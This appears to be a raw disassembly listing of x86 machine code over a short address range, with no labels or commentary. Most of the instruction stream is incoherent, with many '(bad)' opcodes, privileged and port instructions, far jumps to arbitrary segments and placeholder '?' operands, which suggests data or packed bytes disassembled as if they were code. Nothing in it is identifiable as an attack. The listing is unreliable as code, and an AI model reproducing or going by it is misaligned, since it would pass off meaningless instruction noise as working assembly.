  42f9d6:	adc    al,0x74
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42f9d4
  42f9e3:	mov    ah,0x1
  42f9e5:	hlt    
  42f9e6:	inc    BYTE PTR [bx+di]
  42f9e9:	add    BYTE PTR [eax],al
  42f9eb:	add    DWORD PTR [eax],eax
  42f9ed:	add    BYTE PTR [ebp-0x2a],cl
  42f9f0:	xchg   BYTE PTR [eax+0x7393ea02],cl
  42f9f6:	push   edi
  42f9f7:	dec    ebx
  42f9f8:	pop    es
  42f9f9:	sbb    eax,0xfca3c62c
  42f9fe:	cmp    DWORD PTR [ebp+0x33b0890e],edi
  42fa04:	dec    ebx
  42fa05:	mov    eax,ds:0x4b9f49b3
  42fa0a:	out    dx,al
  42fa0b:	stc    
  42fa0c:	xor    esp,DWORD PTR [eax+0x2c05ac05]
  42fa12:	inc    esp
  42fa13:	push   0x5b
  42fa15:	cmp    BYTE PTR ds:0x285b4fa5,ch
  42fa1b:	jns    0x42f9ef
  42fa1d:	sar    DWORD PTR [edi+0xa],cl
  42fa20:	fild   WORD PTR [eax-0x2b]
  42fa23:	out    dx,al
  42fa24:	xchg   ecx,eax
  42fa25:	mov    bh,0xb9
  42fa27:	dec    ebx
  42fa28:	es std 
  42fa2a:	and    BYTE PTR [esi-0xd],cl
  42fa2d:	pop    ecx
  42fa2e:	push   eax
  42fa2f:	inc    ebx
  42fa30:	call   0x8fb4b178
  42fa35:	mov    bl,0x3a
  42fa37:	add    esi,edx
  42fa39:	pop    ecx
  42fa3a:	push   cs
  42fa3b:	mov    ecx,0x683e0c01
  42fa40:	xlat   BYTE PTR ds:[ebx]
  42fa41:	jmp    FWORD PTR [edi-0x11a86439]
  42fa47:	inc    edi
  42fa48:	test   BYTE PTR [ecx+eax*8+0x7845adc0],dh
  42fa4f:	push   ds
  42fa50:	mov    eax,ds:0x1a3d165
  42fa55:	inc    ecx
  42fa56:	add    esi,DWORD PTR [ecx-0x7a]
  42fa59:	stc    
  42fa5a:	xchg   esp,eax
  42fa5b:	enter  0x8f00,0xa6
  42fa5f:	and    al,0xbf
  42fa61:	push   eax
  42fa62:	xor    BYTE PTR [ebp-0x5a5a0eef],0xe3
  42fa69:	xor    BYTE PTR [eax],0x3f
  42fa6c:	inc    DWORD PTR [eax-0x5aad5e4d]
  42fa72:	aaa    
  42fa73:	test   BYTE PTR [edx+0x5f55298c],al
  42fa79:	arpl   WORD PTR [edx],ax
  42fa7b:	stos   BYTE PTR es:[edi],al
  42fa7c:	lods   eax,DWORD PTR ds:[esi]
  42fa7d:	and    ah,BYTE PTR [eax-0x7ed3fe66]
  42fa83:	rcl    DWORD PTR [edi-0x77],0xbd
  42fa87:	in     eax,0x55
  42fa89:	xchg   edx,eax
  42fa8a:	add    eax,0x6a766523
  42fa8f:	add    bl,BYTE PTR [edi]
  42fa91:	mov    eax,0x50a836b0
  42fa96:	jno    0x42fb0b
  42fa98:	mov    edi,0x6423f7df
  42fa9d:	adc    BYTE PTR [ebx+0x4b],bl
  42faa0:	lock xlat BYTE PTR ds:[ebx]
  42faa2:	test   eax,0xccec82d3
  42faa7:	call   0x9fb48743
  42faac:	add    al,bl
  42faae:	and    bl,BYTE PTR [eax]
  42fab0:	ror    edx,1
  42fab2:	xor    BYTE PTR [ecx-0x6d],ch
  42fab5:	push   esp
  42fab6:	and    ecx,DWORD PTR [ecx-0x3b8c0253]
  42fabc:	sbb    edi,esi
  42fabe:	sbb    ebx,DWORD PTR [eax+0x5c]
  42fac1:	test   eax,0x3fb99e20
  42fac6:	inc    eax
  42fac7:	retf   
  42fac8:	jb     0x42facf
  42faca:	mov    ds:0xeb4e9400,eax
  42facf:	inc    BYTE PTR [eax+ebp*8-0x4a]
  42fad3:	int3   
  42fad4:	jmp    0x75fe:0x39e6a023
  42fadb:	test   BYTE PTR [eax],al
  42fadd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fade:	pop    edi
  42fadf:	dec    esp
  42fae0:	fs aas 
  42fae2:	adc    dl,BYTE PTR [ebx-0x21]
  42fae5:	test   BYTE PTR [ebp-0x6cc4210f],cl
  42faeb:	hlt    
  42faec:	das    
  42faed:	mov    al,ds:0x0
	...
  42fb56:	sbb    ebp,edi
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	test   al,0xcd
  42fb64:	stos   DWORD PTR es:[edi],eax
  42fb65:	mov    bh,0x67
  42fb67:	inc    DWORD PTR [ecx]
  42fb69:	add    BYTE PTR [eax],al
  42fb6b:	add    DWORD PTR [eax],eax
  42fb6d:	add    BYTE PTR [ebp+0x19],ch
  42fb70:	sti    
  42fb71:	sbb    DWORD PTR [edx-0x7c04a381],ebp
  42fb77:	adc    DWORD PTR [ebp-0x7b9be261],ecx
  42fb7d:	jp     0x42fb03
  42fb7f:	inc    edi
  42fb80:	push   edx
  42fb81:	int3   
  42fb82:	in     al,dx
  42fb83:	mov    dl,0x9
  42fb85:	adc    dl,BYTE PTR [esi]
  42fb87:	gs retf 0xb84e
  42fb8b:	mov    ds:0x40d2045b,eax
  42fb90:	add    eax,esi
  42fb92:	sub    DWORD PTR [ecx],esi
  42fb94:	xchg   edx,eax
  42fb95:	pop    esp
  42fb96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb97:	fistp  WORD PTR [eax]
  42fb99:	or     al,0x3e
  42fb9c:	fnstcw WORD PTR [ebx]
  42fb9e:	xor    DWORD PTR [esi],ebx
  42fba0:	dec    BYTE PTR [eax]
  42fba2:	aaa    
  42fba3:	ret    0xc461
  42fba6:	jbe    0x42fbb3
  42fba8:	add    ebx,DWORD PTR [edx+0x3e0959b3]
  42fbae:	pop    esp
  42fbaf:	inc    ebx
  42fbb0:	retf   
  42fbb1:	sbb    DWORD PTR ds:0x91f4d2c2,esi
  42fbb7:	enter  0x7d38,0x84
  42fbbb:	jg     0x42fbba
  42fbbd:	pop    edx
  42fbbe:	xor    esi,DWORD PTR [edi-0x19]
  42fbc1:	fidivr WORD PTR [ebx-0x7d987be8]
  42fbc7:	mov    bl,0xfb
  42fbc9:	cmc    
  42fbca:	inc    ebp
  42fbcb:	(bad)  
  42fbcc:	fcom   QWORD PTR [bp-0x1848]
  42fbd1:	adc    cl,BYTE PTR ds:0xfd8cdfa1
  42fbd7:	mov    edx,0x833683d
  42fbdc:	mov    ds:0x4b147361,eax
  42fbe1:	or     al,0x6c
  42fbe3:	cmp    BYTE PTR [edx+0x69a10f4f],bl
  42fbe9:	sub    BYTE PTR [ecx],0x1
  42fbec:	(bad)  
  42fbed:	icebp  
  42fbee:	imul   DWORD PTR [ebx+0xd5e6854]
  42fbf4:	adc    edx,ecx
  42fbf6:	call   0x3189b8ff
  42fbfb:	mov    eax,0x8d22b0d8
  42fc00:	jmp    0xe280:0x1574550f
  42fc07:	stc    
  42fc08:	inc    ecx
  42fc09:	sbb    BYTE PTR [ecx],bh
  42fc0b:	outs   dx,DWORD PTR ds:[esi]
  42fc0c:	outs   dx,DWORD PTR ds:[esi]
  42fc0d:	ror    DWORD PTR [ecx-0x4c],1
  42fc10:	retf   
  42fc11:	loope  0x42fc10
  42fc13:	xchg   ebx,eax
  42fc14:	mov    eax,ds:0xed859eb8
  42fc19:	aam    0x56
  42fc1b:	fs call 0xc60e03dd
  42fc21:	push   eax
  42fc22:	add    ecx,DWORD PTR [edi+0x8e5da8]
  42fc28:	mov    ebx,0xa2f44cd6
  42fc2d:	inc    ebp
  42fc2e:	gs jle 0x42fbbf
  42fc31:	jnp    0x42fc8e
  42fc33:	imul   ebx,DWORD PTR ds:0x58ff7ad5,0x58
  42fc3a:	push   ds
  42fc3b:	dec    edi
  42fc3c:	mov    BYTE PTR [edi+ebp*8],dh
  42fc3f:	aad    0x12
  42fc41:	jge    0x42fbfe
  42fc43:	das    
  42fc44:	inc    edx
  42fc45:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42fc47:	xor    BYTE PTR [esi-0x2fd14b1f],dh
  42fc4d:	cmc    
  42fc4e:	fldenv [ecx]
  42fc50:	adc    BYTE PTR [esi-0xcced703],al
  42fc56:	xchg   edi,eax
  42fc57:	xchg   edx,eax
  42fc58:	push   eax
  42fc59:	pop    es
  42fc5a:	ins    DWORD PTR es:[edi],dx
  42fc5b:	int    0x17
  42fc5d:	or     BYTE PTR [esi+0x7423c33b],0xf0
  42fc64:	pop    ebp
  42fc65:	(bad)  
  42fc66:	scas   eax,DWORD PTR es:[edi]
  42fc67:	push   ds
  42fc68:	nop
  42fc69:	push   ebx
  42fc6a:	mov    DWORD PTR [edx-0x39],ebp
  42fc6d:	daa    
	...
  42fcd6:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fcdc:	mov    ebx,0x36325e9a
  42fce1:	and    BYTE PTR [eax+0x670d8226],cl
  42fce7:	add    BYTE PTR [edx],al
  42fce9:	add    BYTE PTR [eax],al
  42fceb:	add    DWORD PTR [eax],eax
  42fced:	add    BYTE PTR [esi+0x78a3744b],bh
  42fcf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fcf4:	inc    esi
  42fcf5:	ds not dh
  42fcf8:	outs   dx,BYTE PTR ds:[esi]
  42fcf9:	dec    esi
  42fcfa:	mov    esp,0x3519f22b
  42fcff:	xor    edx,0x2f
  42fd02:	pop    es
  42fd03:	jmp    0x8399:0x64e19cfd
  42fd0a:	inc    ecx
  42fd0b:	xchg   ebx,eax
  42fd0c:	inc    eax
  42fd0d:	mov    bh,0x86
  42fd0f:	mov    esp,0x449b4fbb
  42fd14:	test   bl,bh
  42fd16:	iret   
  42fd17:	in     eax,0xbf
  42fd19:	inc    esi
  42fd1a:	retfw  0xbea2
  42fd1e:	or     edi,0x137acedc
  42fd24:	cwde   
  42fd25:	daa    
  42fd26:	leave  
  42fd27:	mov    al,ds:0x5566c53a
  42fd2c:	fild   WORD PTR [edx]
  42fd2e:	push   esp
  42fd2f:	push   ebp
  42fd30:	int    0xdf
  42fd32:	dec    eax
  42fd33:	fwait
  42fd34:	fwait
  42fd35:	scas   eax,DWORD PTR es:[edi]
  42fd36:	and    eax,DWORD PTR [edx+0x58db5081]
  42fd3c:	gs sti 
  42fd3e:	jp     0x42fcca
  42fd40:	xchg   BYTE PTR ds:0x18783c5f,dh
  42fd46:	dec    esi
  42fd47:	jbe    0x42fd0b
  42fd49:	dec    ebp
  42fd4a:	add    edi,ebx
  42fd4c:	pop    DWORD PTR [ecx+0x418532f5]
  42fd52:	sbb    al,dl
  42fd54:	out    dx,eax
  42fd55:	pop    ds
  42fd56:	xor    edi,DWORD PTR [ebp-0xaed9be6]
  42fd5c:	shr    cl,1
  42fd5e:	add    DWORD PTR [ecx+0x651c0df3],ebx
  42fd64:	lods   eax,DWORD PTR ds:[esi]
  42fd65:	cmp    eax,ecx
  42fd67:	pop    ebp
  42fd68:	add    bh,BYTE PTR [edi-0x13]
  42fd6b:	fsub   QWORD PTR [ecx-0x28]
  42fd6e:	pusha  
  42fd6f:	adc    BYTE PTR [edi*8-0x4ba3172],al
  42fd76:	add    ah,ch
  42fd78:	sub    BYTE PTR [edx-0x6cd3d298],ch
  42fd7e:	cmp    al,0x4e
  42fd80:	dec    edi
  42fd81:	sub    BYTE PTR [eax],0x9d
  42fd84:	push   ebx
  42fd85:	mov    ?,WORD PTR [ebp-0xd2249e8]
  42fd8b:	out    dx,eax
  42fd8c:	lea    ebp,[eax]
  42fd8e:	jbe    0x42fd75
  42fd90:	(bad)  
  42fd91:	ja     0x42fd1b
  42fd93:	xor    eax,DWORD PTR [edi]
  42fd95:	cli    
  42fd96:	mov    bl,0x9e
  42fd98:	mov    cs,WORD PTR [ebx-0x6]
  42fd9b:	retf   
  42fd9c:	cmp    DWORD PTR [edx+0x1b273443],ecx
  42fda2:	mov    dl,0x37
  42fda4:	mov    ebx,0xf115052d
  42fda9:	std    
  42fdaa:	retf   0x9d69
  42fdad:	bswap  edi
  42fdaf:	cmp    eax,0xcfec6b9d
  42fdb4:	aas    
  42fdb5:	inc    esp
  42fdb6:	bnd ret 
  42fdb8:	jge    0x42fd81
  42fdba:	xchg   esi,eax
  42fdbb:	mov    WORD PTR [eax+edi*2+0x10],es
  42fdbf:	js     0x42fe31
  42fdc1:	jno    0x42fd90
  42fdc3:	xor    DWORD PTR [eax+ebx*8+0x77c51b16],ebp
  42fdca:	ins    DWORD PTR es:[edi],dx
  42fdcb:	jle    0x42fd77
  42fdcd:	shl    BYTE PTR [ecx],cl
  42fdcf:	test   al,0x1
  42fdd1:	fs cmp eax,0x945f8d9
  42fdd7:	and    ebx,DWORD PTR [ebp-0x7e44939e]
  42fddd:	jmp    0xb644:0xab0ff21b
  42fde4:	mov    edi,0x1c6208b5
  42fde9:	aas    
  42fdea:	dec    ecx
  42fdeb:	stos   BYTE PTR es:[edi],al
  42fdec:	add    eax,0x4f
	...
  42fe55:	add    BYTE PTR [eax-0x40],cl
  42fe58:	ret    0xcaf0
  42fe5b:	bnd jp 0x42fe56
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz cmc 
  42fe63:	not    BYTE PTR [eax+0x2016716]
  42fe69:	add    BYTE PTR [eax],al
  42fe6b:	add    DWORD PTR [eax],eax
  42fe6d:	add    BYTE PTR [edi+eax*2-0x2a1bdc4],bl
  42fe74:	add    al,0xd8
  42fe76:	mov    DWORD PTR [edx],eax
  42fe78:	xchg   ebp,eax
  42fe79:	push   ss
  42fe7a:	out    0xd0,al
  42fe7c:	ret    
  42fe7d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42fe7f:	push   eax
  42fe80:	dec    ebx
  42fe81:	push   edi
  42fe82:	add    BYTE PTR [ebp+0x66],bh
  42fe85:	push   edx
  42fe86:	adc    al,0x5f
  42fe88:	pop    ebx
  42fe89:	adc    DWORD PTR [ebp-0x4f],ebp
  42fe8c:	xor    DWORD PTR [esp+ebx*2+0x44fac295],eax
  42fe93:	aam    0x44
  42fe95:	xor    bl,BYTE PTR [edi+edx*1+0x2e73ea9d]
  42fe9c:	inc    ecx
  42fe9d:	push   cs
  42fe9e:	cmp    esp,ebx
  42fea0:	mov    ecx,0xfbe492e2
  42fea5:	inc    eax
  42fea6:	inc    edx
  42fea7:	xor    al,0xa3
  42fea9:	outs   dx,BYTE PTR ds:[esi]
  42feaa:	mov    edx,0x32ebbc23
  42feaf:	push   es
  42feb0:	and    eax,0x559f241c
  42feb5:	mov    ebp,0x57a4c212
  42feba:	pop    ebx
  42febb:	sub    esi,DWORD PTR [ebx-0x3b]
  42febe:	add    bl,BYTE PTR [ebx-0x1d]
  42fec1:	pusha  
  42fec2:	push   esi
  42fec3:	xchg   ebp,eax
  42fec4:	das    
  42fec5:	int3   
  42fec6:	adc    BYTE PTR [ecx-0x4c],ch
  42fec9:	es inc ebx
  42fecb:	div    DWORD PTR [ebp-0x74]
  42fece:	xchg   esp,edx
  42fed0:	mov    cl,BYTE PTR [ebx-0x66]
  42fed3:	scas   al,BYTE PTR es:[edi]
  42fed4:	(bad)  
  42fed5:	shr    esp,1
  42fed7:	lock cmp dl,ah
  42feda:	scas   al,BYTE PTR es:[edi]
  42fedb:	pop    fs
  42fedd:	into   
  42fede:	out    dx,al
  42fedf:	pusha  
  42fee0:	in     eax,dx
  42fee1:	inc    edx
  42fee2:	ror    DWORD PTR [esp+ebx*4-0x50e7dea9],1
  42fee9:	add    al,0x94
  42feeb:	cdq    
  42feec:	xchg   DWORD PTR [ecx],eax
  42feee:	push   edx
  42feef:	push   ds
  42fef0:	(bad)  
  42fef1:	xor    al,0xb7
  42fef3:	loop   0x42ff11
  42fef5:	les    eax,FWORD PTR [eax]
  42fef7:	cli    
  42fef8:	cs sti 
  42fefa:	cmp    DWORD PTR [eax-0x7fbb5e08],ebp
  42ff00:	pop    eax
  42ff01:	push   ebp
  42ff02:	cmp    cl,BYTE PTR es:[ebp+0x7f]
  42ff06:	stc    
  42ff07:	aaa    
  42ff08:	fsubr  DWORD PTR [ebx+0x61f7013a]
  42ff0e:	fs ja  0x42ff2b
  42ff11:	ror    BYTE PTR [ebx+0x6c89e1d2],0xc0
  42ff18:	sti    
  42ff19:	arpl   WORD PTR [edx+ecx*2+0x60],si
  42ff1d:	mov    ds:0x47515861,eax
  42ff22:	outs   dx,DWORD PTR ds:[esi]
  42ff23:	jp     0x42ff6a
  42ff25:	lahf   
  42ff26:	xchg   DWORD PTR [ecx],edi
  42ff28:	inc    ecx
  42ff29:	dec    eax
  42ff2a:	in     eax,dx
  42ff2b:	cmp    bh,al
  42ff2d:	int3   
  42ff2e:	push   cs
  42ff2f:	cli    
  42ff30:	lea    edx,[edx+0x2a]
  42ff33:	xor    BYTE PTR [eax+edx*1+0x1e],0x56
  42ff38:	xlat   BYTE PTR ds:[ebx]
  42ff39:	mov    edi,0x97b904ed
  42ff3e:	or     DWORD PTR [ecx-0x532c3a6c],ecx
  42ff44:	imul   ecx,DWORD PTR [ebp+0x2b],0xfffffffa
  42ff48:	inc    eax
  42ff49:	push   ds
  42ff4a:	pop    ebx
  42ff4b:	xchg   esi,eax
  42ff4c:	inc    ebp
  42ff4d:	ror    bh,1
  42ff4f:	pop    ecx
  42ff50:	inc    edi
  42ff51:	lahf   
  42ff52:	inc    edx
  42ff53:	add    ah,BYTE PTR [edx]
  42ff55:	pop    edx
  42ff56:	xchg   BYTE PTR [ecx-0x36],ch
  42ff59:	mov    edx,0x5d6d5e47
  42ff5e:	inc    ebx
  42ff5f:	in     eax,dx
  42ff60:	push   ebp
  42ff62:	aas    
  42ff63:	sbb    eax,0xa372fd60
  42ff68:	rcr    BYTE PTR [ecx+0x11],cl
  42ff6b:	int3   
  42ff6c:	mov    ecx,ds
	...
  42ffd6:	add    al,0x67
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [esp+ecx*2+0x65],0xdc
  42ffe5:	fisub  DWORD PTR [edi+0x2]
  42ffe8:	add    al,BYTE PTR [eax]
  42ffea:	test   eax,0xa8000000
  42ffef:	xchg   edx,eax
  42fff0:	cdq    
  42fff1:	unpckhps xmm4,xmm6
  42fff4:	shr    BYTE PTR [ecx+0x1d56e67a],1
  42fffa:	je     0x430004
  42fffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fffd:	int3   
  42fffe:	pop    ebp
  42ffff:	js     0x43000f
  430001:	and    al,0x44
  430003:	aad    0x2f
  430005:	push   0xeefcd392
  43000a:	cmp    ebp,DWORD PTR [ebx-0x72]
  43000d:	popf   
  43000e:	jb     0x42ff91
  430010:	add    eax,0x27453e80
  430015:	dec    ebx
  430016:	or     BYTE PTR [ecx-0x745201cb],bh
  43001c:	xor    DWORD PTR [edx-0x42],0x85b6ec57
  430023:	sbb    ch,bh
  430025:	mov    BYTE PTR [ebp+0x3b522d38],dh
  43002b:	popa   
  43002c:	out    dx,eax
  43002d:	mov    bh,0x64
  43002f:	cs hlt 
  430031:	cmp    al,0x9e
  430033:	lock pop edi
  430035:	lods   eax,DWORD PTR ds:[esi]
  430036:	sbb    al,0x90
  430038:	shr    BYTE PTR [ebx],1
  43003a:	ins    DWORD PTR es:[edi],dx
  43003b:	sub    ah,BYTE PTR [esi-0x46]
  43003e:	cld    
  43003f:	ret    
  430040:	cld    
  430041:	inc    ebp
  430042:	fwait
  430043:	and    eax,0x7ce2f156
  430048:	not    al
  43004a:	sub    al,0x49
  43004c:	xor    al,0xc2
  43004e:	add    BYTE PTR ds:0x1810bafc,al
  430054:	xchg   esi,eax
  430055:	xor    ebp,DWORD PTR [edx+0x739a266d]
  43005b:	fild   WORD PTR [ebp-0x7a2fe634]
  430061:	fcom   DWORD PTR [ebp+0x1a]
  430064:	xchg   esp,eax
  430065:	jmp    FWORD PTR [eax+0x75]
  430068:	fs retf 0x491d
  43006c:	pop    esi
  43006d:	popa   
  43006e:	fwait
  43006f:	mov    edx,0x41473f63
  430074:	out    0xf1,eax
  430076:	or     eax,0x62fd96a4
  43007b:	dec    ebx
  43007c:	cmp    BYTE PTR [ecx-0x5a],0x8f
  430080:	adc    ebx,DWORD PTR [edx]
  430082:	pop    ss
  430083:	cdq    
  430084:	test   al,0x9d
  430086:	cmp    eax,0x53dc645b
  43008b:	and    BYTE PTR [edi+esi*1+0x69],0x77
  430090:	push   ebx
  430091:	ror    BYTE PTR [eax-0x49dbe694],cl
	...
  4300d3:	add    BYTE PTR [eax],al
  4300d5:	add    BYTE PTR [ebp+0x55],cl
  4300d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4300de:	mov    esp,ebp
  4300e0:	or     al,ah
  4300e2:	dec    ebp
  4300e3:	add    bh,al
  4300e5:	add    BYTE PTR [eax],cl
  4300e7:	add    BYTE PTR [eax],al
  4300e9:	mov    DWORD PTR [eax],0x3ff44545
  4300ef:	xor    DWORD PTR [eax],eax
  4300f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4300f7:	(bad)  
  4300f8:	enter  0x4d45,0xb8
  4300fc:	mov    esi,DWORD PTR [edx]
  4300fe:	hlt    
  4300ff:	test   ebx,ecx
  430101:	pushf  
  430102:	enter  0x4df8,0x8b
  430106:	mov    DWORD PTR [ebp+0x8],0x894708
  43010d:	inc    ebp
  43010e:	mov    ebp,0xff8bfffc
  430113:	dec    ebp
  430114:	mov    ch,0xf4
  430116:	call   DWORD PTR [ebx-0x1]
  430119:	mov    ebx,0x8005426
  43011e:	call   DWORD PTR [ecx+0x8]
  430121:	pop    es
  430122:	jmp    0xb8:0x9cb4533
  430129:	fwait
  43012a:	mov    esi,DWORD PTR [edx-0xc]
  43012d:	xor    al,bl
  43012f:	add    BYTE PTR [ebx+0x3c83203],bl
  430135:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43013b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430141:	xor    eax,DWORD PTR [eax]
  430143:	retf   
  430144:	ret    
  430145:	add    eax,esi
  430147:	enter  0x8945,0x64
  43014b:	dec    ebp
  43014c:	sbb    ah,cl
  43014e:	add    BYTE PTR [ebx-0xb87b277],cl
  430154:	dec    DWORD PTR [ebx-0xbcfb275]
  43015a:	test   DWORD PTR [ebx],esi
  43015c:	dec    ebx
  43015e:	inc    DWORD PTR [ebx]
  430160:	inc    eax
  430161:	enter  0x8989,0x64
  430165:	(bad)  
  430166:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43016a:	cld    
  43016b:	dec    DWORD PTR [ebp-0xa90001]
  430171:	push   edi
  430172:	mov    BYTE PTR [edx+0x1],ch
  430175:	and    DWORD PTR [eax],eax
  430177:	pop    ecx
  430178:	inc    ebp
  430179:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43017f:	push   0xffffff89
  430181:	pop    ecx
  430182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430183:	dec    ebp
  430184:	add    BYTE PTR [ecx+0x45fc088b],cl
  43018a:	jne    0x4301d5
  43018c:	lea    eax,[eax]
  43018e:	fs (bad) 
  430190:	dec    DWORD PTR [eax]
  430192:	mov    DWORD PTR [eax],eax
  430194:	test   al,0x0
  430196:	add    BYTE PTR [ebp-0x18],cl
  430199:	xor    ebp,DWORD PTR [edx]
  43019b:	add    eax,DWORD PTR [eax]
  43019d:	mov    eax,eax
  43019f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4301a6:	inc    ebp
  4301a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4301ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4301b3:	inc    eax
  4301b4:	cmp    bh,0x1
  4301b7:	lea    eax,[eax]
  4301b9:	and    BYTE PTR [eax],al
  4301bb:	inc    DWORD PTR [ecx-0x18]
  4301be:	mov    ecx,DWORD PTR [ebx]
  4301c0:	cld    
  4301c1:	add    BYTE PTR [ecx+0x75014d],cl
  4301c7:	(bad)  
  4301c8:	xchg   ebp,eax
  4301c9:	sar    bh,1
  4301cb:	inc    eax
  4301cc:	inc    DWORD PTR [eax]
  4301ce:	mov    eax,DWORD PTR [ebp-0x4]
  4301d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4301d7:	add    BYTE PTR [edx],dl
  4301d9:	(bad)  
  4301da:	nop
  4301db:	inc    ebp
  4301dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4301e2:	mov    al,0xff
  4301e4:	add    bh,bh
  4301e6:	add    BYTE PTR [ebx],dh
  4301e8:	inc    DWORD PTR [ebx]
  4301ea:	sbb    al,0x89
  4301ec:	jne    0x4301ca
  4301ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4301f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4301fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430201:	inc    DWORD PTR [ebp-0x75]
  430204:	fisttp QWORD PTR [esi+ebp*8]
  430207:	test   DWORD PTR [esi-0x1],esp
  43020a:	inc    ebp
  43020b:	(bad)  
  43020c:	aas    
  43020d:	inc    ebp
  43020e:	(bad)  
  43020f:	lea    edi,[eax+edi*2-0x1]
  430213:	inc    edi
  430215:	mov    DWORD PTR ds:0x8000c7a0,edi
  43021b:	mov    ebp,esp
  43021d:	cld    
  43021e:	loop   0x4301ad
  430220:	inc    ebp
  430221:	(bad)  
  430222:	out    dx,al
  430223:	(bad)  
  430224:	fisttp WORD PTR [eax+0x8801c7]
  43022a:	jecxz  0x430271
  43022c:	in     al,dx
  43022d:	inc    DWORD PTR [ebp-0x4]
  430230:	out    0x8d,eax
  430232:	aas    
  430233:	(bad)  
  430234:	call   0xcb2d38
  430239:	add    DWORD PTR [ebx-0x7f490400],ecx
  43023f:	add    BYTE PTR [ecx],al
  430241:	test   DWORD PTR [eax],eax
  430243:	wrmsr  
  430245:	ja     0x430242
  430247:	add    BYTE PTR [eax],al
  430249:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43024f:	add    esp,edi
  430251:	add    BYTE PTR [eax+0x450108],al
  430257:	mov    edi,DWORD PTR [ebp-0x6c]
  43025a:	add    DWORD PTR [eax],0x4
  43025d:	mov    eax,DWORD PTR [ebp+0x3]
  430260:	mov    edi,DWORD PTR [esp+edi*8]
  430263:	dec    ebp
  430264:	nop
  430265:	mov    eax,DWORD PTR [ecx]
  430267:	fadd   DWORD PTR [eax]
  430269:	add    BYTE PTR [ecx*4-0xafa000],dl
  430270:	inc    ebp
  430271:	push   edx
  430272:	call   DWORD PTR [ebp-0x7b]
  430275:	mov    esi,DWORD PTR [ebp-0x74]
  430278:	mov    eax,DWORD PTR [eax]
  43027a:	cld    
  43027b:	mov    eax,DWORD PTR [eax+0x880103]
  430281:	add    BYTE PTR [ebp+0x6a],bh
  430284:	cmp    edi,0x10
  430287:	mov    WORD PTR [ebp+0x0],es
  43028a:	mov    edx,DWORD PTR [edx-0x4]
  43028d:	push   ecx
  43028e:	nop
  43028f:	inc    DWORD PTR [ecx]
  430291:	cld    
  430292:	add    BYTE PTR [ebp-0x16],bh
  430295:	mov    eax,DWORD PTR [eax]
  430297:	cld    
  430298:	push   eax
  430299:	nop
  43029a:	inc    ebp
  43029b:	add    edi,edi
  43029d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4302a3:	jmp    0xe33b:0x9403c733
  4302aa:	movntq QWORD PTR [edx],mm7
  4302ad:	mov    DWORD PTR [eax],0xb87e8b98
  4302b3:	test   ebx,eax
  4302b5:	jmp    DWORD PTR [ebp-0x1]
  4302b8:	int    0xed
  4302ba:	sub    esp,esi
  4302bc:	add    eax,DWORD PTR [ebp-0x30]
  4302bf:	fild   WORD PTR [ebp+0x3f]
  4302c2:	cmp    eax,edi
  4302c4:	je     0xc043e8ea
  4302ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4302d1:	(bad)  
  4302d2:	jne    0x430260
  4302d4:	mov    ebx,ebp
  4302d6:	cld    
  4302d7:	jle    0x43031e
  4302d9:	dec    ecx
  4302da:	mov    eax,DWORD PTR [eax]
  4302dc:	mov    ah,0x50
  4302de:	add    BYTE PTR [ebp-0x18],al
  4302e1:	mov    ebp,DWORD PTR [ecx]
  4302e3:	test   al,0x0
  4302e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4302eb:	add    DWORD PTR es:[eax],eax
  4302ee:	add    al,al
  4302f0:	xor    BYTE PTR [eax+0x4f],dl
  4302f3:	inc    ebp
  4302f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4302fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430300:	add    DWORD PTR [ecx+0x458be845],ecx
  430306:	fmul   DWORD PTR [ebx+0x8bb800]
  43030c:	cld    
  43030d:	call   0xd82dd2
  430312:	dec    DWORD PTR [ebx+0x109ee8ff]
  430318:	add    al,al
  43031a:	push   eax
  43031b:	es inc ebp
  43031d:	inc    ebp
  43031e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430324:	dec    DWORD PTR [ebx-0x3ff70301]
  43032a:	mov    DWORD PTR gs:[eax],eax
  43032d:	call   0x8c134867
  430332:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430339:	sub    eax,ebx
  43033b:	add    BYTE PTR [eax],al
  43033d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430343:	inc    ebp
  430344:	push   ebp
  430345:	mov    ebp,eax
